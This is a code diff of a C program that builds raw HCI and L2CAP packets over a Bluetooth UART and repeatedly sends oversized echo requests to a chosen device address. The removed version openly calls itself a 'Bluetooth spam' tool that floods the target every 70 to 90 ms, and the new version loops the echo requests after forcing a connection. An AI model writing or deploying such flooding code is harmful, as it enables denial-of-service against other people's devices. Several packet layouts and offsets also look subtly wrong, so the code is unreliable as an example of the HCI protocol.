@@ -4,22 +4,40 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <termios.h>
-#include <signal.h>
+#include <errno.h>
+#include <stdint.h>
 #include <time.h>
+#include <sys/time.h>
 
-#define BT_UART "/dev/ttyHSL0" // Bluetooth UART device
-#define UNUSED(x) (void)(x)
+#define BT_UART "/dev/ttyHSL0"  // UART Bluetooth Interface
 
-int fd;
-char target_addr[18]; // Store Bluetooth address
+#define HCI_CMD_HDR_SIZE 3
+#define HCI_EVENT_HDR_SIZE 2
+#define HCI_ACL_HDR_SIZE 4
+#define L2CAP_HDR_SIZE 4
 
-// Handle SIGINT (CTRL+C)
-void signal_handler(int signo) {
-    printf("Received signal %d\n", signo);
-    UNUSED(signo);
-    printf("\nStopping Bluetooth spam...\n");
-    if (fd > 0) close(fd);
-    exit(0);
+#define HCI_CREATE_CONN_OPCODE 0x0405
+#define HCI_EVENT_CONN_COMPLETE 0x03
+#define HCI_ACL_DATA_PACKET 0x02
+
+#define L2CAP_CID_SIGNALING 0x0001
+#define L2CAP_ECHO_REQ 0x08
+#define L2CAP_ECHO_RESP 0x09
+
+#define ECHO_PAYLOAD_SIZE 600  // Echo request payload size
+
+uint8_t target_bdaddr[6];
+
+/**
+ * Convert a Bluetooth address string "BC:9A:78:56:34:12" into uint8_t[6].
+ */
+int parse_bdaddr(const char *str, uint8_t *bdaddr) {
+    if (sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+               &bdaddr[5], &bdaddr[4], &bdaddr[3], &bdaddr[2], &bdaddr[1], &bdaddr[0]) != 6) {
+        fprintf(stderr, "Invalid Bluetooth address format!\n");
+        return -1;
+    }
+    return 0;
 }
 
 // Open and configure UART
@@ -56,102 +74,143 @@ int open_uart() {
     return fd;
 }
 
-// Validate Bluetooth address format
-int is_valid_bt_addr(const char *addr) {
-    int a, b, c, d, e, f;
-    return sscanf(addr, "%2x:%2x:%2x:%2x:%2x:%2x", &a, &b, &c, &d, &e, &f) == 6;
-}
-
-
-void send_l2cap_echo_request(int fd) {
-    srand(time(NULL));
-
-    size_t random_size = (rand() % (600 - 590 + 1)) + 590;
-    uint8_t hci_packet[random_size + 8];
-    memset(hci_packet, 0, sizeof(hci_packet));
-
-    // Extract the target Bluetooth address (6 bytes)
-    uint8_t bt_addr[6];
-    sscanf(target_addr, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
-           &bt_addr[0], &bt_addr[1], &bt_addr[2], 
-           &bt_addr[3], &bt_addr[4], &bt_addr[5]);
-
-    // HCI ACL Data Header (4 bytes)
-    hci_packet[0] = 0x02;  // HCI Packet Type: ACL Data
-    hci_packet[1] = 0x0B;  // Handle (example: 0x000B)
-    hci_packet[2] = 0x20;  // Flags: PB=10 (Start of L2CAP packet)
-    hci_packet[3] = 0xFA;  // ACL Length = 606 bytes (0xFA 0x02)
-
-    // L2CAP Header (4 bytes)
-    hci_packet[4] = 0xF6;  // L2CAP Length = 600 bytes (0xF6 0x02)
-    hci_packet[5] = 0x02;
-    hci_packet[6] = 0x01;  // L2CAP CID = Signaling Channel (0x0001)
-    hci_packet[7] = 0x00;
-
-    // L2CAP Echo Request Header (4 bytes)
-    hci_packet[8] = 0x08;  // Code: Echo Request
-    hci_packet[9] = 0x01;  // Identifier
-    hci_packet[10] = 0xF6; // Length = 600 bytes (0xF6 0x02)
-    hci_packet[11] = 0x02;
+int send_hci_cmd(int fd, uint16_t opcode, uint8_t *params, uint8_t param_len) {        
+    uint8_t packet[HCI_CMD_HDR_SIZE + param_len];    
     
-    // Include the Bluetooth address (6 bytes) in the packet
-    // Assuming you want to embed it in the packet's payload (adjust where needed)
-    memcpy(&hci_packet[12], bt_addr, 6);  // Embed BT address in packet (adjust the offset)
-
-    memset(&hci_packet[18], 'A', sizeof(hci_packet) - 18);  // Fill the rest of the packet
-
-    ssize_t result = write(fd, hci_packet, sizeof(hci_packet));
-    if (result < 0) {
-        perror("Failed to send Echo Request");
-        printf("Error code: %d\n", errno);
-        close(fd);
-        exit(EXIT_FAILURE);
-    }    
-
-    printf("Echo Request sent to %s!\n", target_addr);    
+    packet[0] = opcode & 0xFF;
+    packet[1] = (opcode >> 8) & 0xFF;
+    packet[2] = param_len;
+    memcpy(&packet[3], params, param_len);
+    
+    return write(fd, packet, sizeof(packet)) < 0 ? -1 : 0;
 }
 
+int read_hci_event(int fd, uint8_t *buf, int size, int timeout_ms) {
+    int len;
+    clock_t start = clock();
 
-void receive_l2cap_echo_response(int fd) {
-    uint8_t buffer[1024];
+    while (1) {
+        len = read(fd, buf, size);        
+        if (len > 0) return len;
 
-    int len = read(fd, buffer, sizeof(buffer));
-    if (len > 0) {
-        if (buffer[6] == 0x09) {  
-            printf("Echo Response received from %s!\n", target_addr);
-        } else {
-            printf("Received unknown packet\n");
-        }     
-    }    
+        if (((clock() - start) * 1000 / CLOCKS_PER_SEC) >= timeout_ms) return -1;
+        usleep(1000);  // Avoid busy looping
+    }
+}
+
+int send_l2cap_echo(int fd, uint16_t handle) {
+    uint8_t packet[HCI_ACL_HDR_SIZE + L2CAP_HDR_SIZE + ECHO_PAYLOAD_SIZE];
+    uint16_t pb_bc_flag = 0x2000;
+    uint16_t acl_handle = handle | pb_bc_flag;
+    uint16_t l2cap_length = ECHO_PAYLOAD_SIZE;
+
+    packet[0] = acl_handle & 0xFF;
+    packet[1] = (acl_handle >> 8) & 0xFF;
+    packet[2] = (l2cap_length + L2CAP_HDR_SIZE) & 0xFF;
+    packet[3] = ((l2cap_length + L2CAP_HDR_SIZE) >> 8) & 0xFF;
+
+    packet[4] = l2cap_length & 0xFF;
+    packet[5] = (l2cap_length >> 8) & 0xFF;
+    packet[6] = L2CAP_CID_SIGNALING & 0xFF;
+    packet[7] = (L2CAP_CID_SIGNALING >> 8) & 0xFF;
+
+    packet[8] = L2CAP_ECHO_REQ;
+    packet[9] = 0x01;
+    packet[10] = ECHO_PAYLOAD_SIZE & 0xFF;
+    packet[11] = (ECHO_PAYLOAD_SIZE >> 8) & 0xFF;
+
+    memset(&packet[12], 0xAA, ECHO_PAYLOAD_SIZE);  // Fill payload with 0xAA
+
+    return write(fd, packet, sizeof(packet)) < 0 ? -1 : 0;
+}
+
+int wait_l2cap_echo_response(int fd, int timeout_ms) {
+    uint8_t buf[256];
+
+    while (1) {
+        int len = read_hci_event(fd, buf, sizeof(buf), timeout_ms);
+        if (len < 0) return -1;
+
+        if (buf[1] == HCI_ACL_DATA_PACKET && buf[6] == L2CAP_ECHO_RESP) {
+            printf("Received L2CAP Echo Response!\n");
+            return 0;
+        }
+    }
+
+    return -1;
+}
+
+int establish_connection(int fd) {
+    uint8_t params[13] = {
+        target_bdaddr[0], target_bdaddr[1], target_bdaddr[2],
+        target_bdaddr[3], target_bdaddr[4], target_bdaddr[5],
+        0x18, 0xCC, 0x01, 0x00, 0x00, 0x00, 0x01
+    };
+
+    while (1) {
+        printf("Attempting to establish connection ...\n");
+
+        if (send_hci_cmd(fd, HCI_CREATE_CONN_OPCODE, params, sizeof(params)) < 0) {
+            printf("Failed to send connection request. Retrying...\n");
+            usleep(2000000);  // 2 seconds delay
+            continue;
+        }
+        
+        uint8_t buf[256];
+        uint16_t handle = 0;        
+        time_t start = time(NULL);
+                
+        while ((time(NULL) - start) < 5) {  // 5-second timeout
+            int len = read_hci_event(fd, buf, sizeof(buf), 3000);
+            if (len < 0) continue;
+
+            printf("Length is bigger than 0");
+            if (buf[1] == HCI_EVENT_CONN_COMPLETE) {
+                handle = buf[3] | (buf[4] << 8);
+                printf("Connection established! Handle: 0x%04X\n", handle);
+                return handle;
+            }
+        }
+
+        printf("Connection timeout. Retrying...\n");
+        usleep(2000000);
+    }
+}
+
+void l2cap_echo_loop(int fd, uint16_t handle) {
+    while (1) {
+        printf("Sending L2CAP Echo Request...\n");
+
+        if (send_l2cap_echo(fd, handle) < 0) {
+            printf("Failed to send L2CAP Echo Request. Retrying in 1s...\n");
+            usleep(1000000);
+            continue;
+        }
+
+        if (wait_l2cap_echo_response(fd, 1000) < 0) {
+            printf("No response received. Retrying...\n");
+            usleep(1000000);
+            continue;
+        }
+
+        printf("L2CAP Echo successful. Sending another in 1s...\n");
+        usleep(1000000);
+    }
 }
 
 int main(int argc, char *argv[]) {
     if (argc != 2) {
-        fprintf(stderr, "Usage: %s <Bluetooth Address>\n", argv[0]);
-        return EXIT_FAILURE;
+        fprintf(stderr, "Usage: %s <BD_ADDR>\n", argv[0]);
+        return 1;
     }
 
-    strncpy(target_addr, argv[1], sizeof(target_addr) - 1);
-    target_addr[sizeof(target_addr) - 1] = '\0';
+    if (parse_bdaddr(argv[1], target_bdaddr) < 0) return 1;
 
-    if (!is_valid_bt_addr(target_addr)) {
-        fprintf(stderr, "Invalid Bluetooth address format.\n");
-        return EXIT_FAILURE;
-    }
+    int fd = open_uart();
+    if (fd < 0) return 1;
 
-    printf("Targeting Bluetooth device: %s\n", target_addr);
-    
-    signal(SIGINT, signal_handler);
-    fd = open_uart();
-
-    while (1) {
-        srand(time(NULL));    
-        int sleep_time = (rand() % (90 - 70 + 1)) + 70;
-
-        send_l2cap_echo_request(fd);        
-        receive_l2cap_echo_response(fd);
-        usleep(sleep_time * 1000);
-    }
+    uint16_t handle = establish_connection(fd);
+    l2cap_echo_loop(fd, handle);
 
     close(fd);
     return 0;
